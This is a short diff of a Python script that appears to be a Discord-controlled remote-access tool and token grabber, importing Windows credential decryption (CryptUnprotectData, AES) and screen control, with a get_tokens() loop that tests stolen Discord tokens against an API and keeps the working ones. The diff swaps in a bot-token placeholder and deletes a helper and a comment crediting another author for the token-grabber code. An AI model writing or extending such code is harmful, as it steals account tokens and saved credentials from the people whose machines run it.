@@ -12,11 +12,10 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 import re
 import win32com.client as wincl
-from contextlib import contextmanager
 import pyautogui
 
 #token = sys.argv[1]
-token = "naw"
+token = "YOUR_BOT_TOKEN"
 
 kdot = commands.Bot(command_prefix=".", intents=discord.Intents.all())
 kdot.remove_command("help")
@@ -28,16 +27,6 @@ def is_admin():
         return False
     else:
         return True
-
-
-@contextmanager
-def stdoutIO(stdout=None):
-    old = sys.stdout
-    if stdout is None:
-        stdout = io.StringIO()
-    sys.stdout = stdout
-    yield stdout
-    sys.stdout = old
 
 
 @kdot.event
@@ -421,7 +410,6 @@ def get_tokens():
         r = requests.get(url, headers={"Authorization": token})
         if r.status_code == 200:
             working.append(token)
-            #ngl I basically stole the entire token grabber part from addidix so go give him love or sum idk
         return working
 
 if __name__ == "__main__":
